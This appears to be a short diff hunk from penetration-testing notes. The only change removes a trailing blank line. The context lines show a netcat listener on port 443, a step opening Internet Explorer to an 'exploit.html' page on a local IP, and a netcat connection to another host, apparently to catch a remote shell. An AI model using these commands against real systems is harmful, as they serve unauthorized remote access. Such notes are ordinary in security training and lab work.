@@ -453,4 +453,3 @@ nc -lvnp 443
 - Windows
 Open IE to 192.168.1.5/exploit.html
 nc -nv 192.168.1.11 443
-
